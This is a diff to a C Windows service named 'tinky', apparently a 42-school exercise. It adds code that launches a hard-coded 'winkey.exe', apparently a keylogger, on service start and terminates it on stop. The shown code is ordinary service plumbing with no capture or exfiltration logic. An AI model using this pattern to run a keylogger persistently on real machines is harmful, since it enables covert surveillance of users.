@@ -12,12 +12,14 @@
 #include <strsafe.h>
 #include <tlhelp32.h>
 
+#define WINKEY_PATH "C:\\Users\\rever\\source\\repos\\sdummett-at-42\\tinky-winkey\\winkey.exe"
 #define SVC_NAME "tinky"
 #define SVC_ERROR 1
 
 SERVICE_STATUS          g_svc_status;
 SERVICE_STATUS_HANDLE   g_svc_status_handle;
 HANDLE                  g_h_svc_stop_event = NULL;
+HANDLE g_h_process = NULL; // Handle global pour le processus
 
 VOID WINAPI svc_ctrl_handler(DWORD);
 VOID WINAPI svc_main(DWORD, LPTSTR*);
@@ -25,6 +27,7 @@ VOID WINAPI svc_main(DWORD, LPTSTR*);
 VOID report_svc_status(DWORD, DWORD, DWORD);
 VOID svc_init(DWORD, LPTSTR*);
 VOID svc_report_event(LPTSTR);
+void print_error(const char* msg);
 
 //
 // Purpose: 
@@ -67,6 +70,47 @@ static VOID WINAPI svc_main(DWORD argc, LPTSTR* argv)
     svc_init(argc, argv);
 }
 
+static void start_process(LPCTSTR lpApplicationName)
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Launch the process
+    if (!CreateProcess(lpApplicationName,   // Name of the executable file
+        NULL,                // Command line parameters
+        NULL,                // Process security attributes
+        NULL,                // Thread security attributes
+        FALSE,               // Inherit handles
+        0,                   // Creation flags
+        NULL,                // Environment block
+        NULL,                // Current directory
+        &si,                 // Startup information
+        &pi))                // Process information
+    {
+        print_error("Failed to create process");
+        return;
+    }
+
+    g_h_process = pi.hProcess; // Store the process handle globally
+
+    // Close the handle for the thread
+    CloseHandle(pi.hThread);
+}
+
+static void stop_process(void)
+{
+    if (g_h_process != NULL)
+    {
+        TerminateProcess(g_h_process, 0);
+        CloseHandle(g_h_process);
+        g_h_process = NULL;
+    }
+}
+
 //
 // Purpose: 
 //   The service code
@@ -103,20 +147,13 @@ static VOID svc_init(DWORD argc, LPTSTR* argv)
     }
 
     // Report running status when initialization is complete.
-
     report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);
 
-    // TO_DO: Perform work until service stops.
+    // Perform work until service stops.
+	start_process(WINKEY_PATH);
 
-    while (1)
-    {
-        // Check whether to stop the service.
-
-        WaitForSingleObject(g_h_svc_stop_event, INFINITE);
-
-        report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
-        return;
-    }
+    WaitForSingleObject(g_h_svc_stop_event, INFINITE);
+    report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
 }
 
 //
@@ -177,6 +214,9 @@ static VOID WINAPI svc_ctrl_handler(DWORD ctrl)
     case SERVICE_CONTROL_STOP:
         report_svc_status(SERVICE_STOP_PENDING, NO_ERROR, 0);
 
+		// Stop the process
+		stop_process();
+
         // Signal the service to stop.
 
         SetEvent(g_h_svc_stop_event);
@@ -190,7 +230,6 @@ static VOID WINAPI svc_ctrl_handler(DWORD ctrl)
     default:
         break;
     }
-
 }
 
 //
@@ -594,6 +633,7 @@ int main(int argc, char* argv[]) {
         stop_service();
     }
     else if (strcmp(argv[1], "delete") == 0) {
+        stop_service();
         delete_service();
     }
     else {
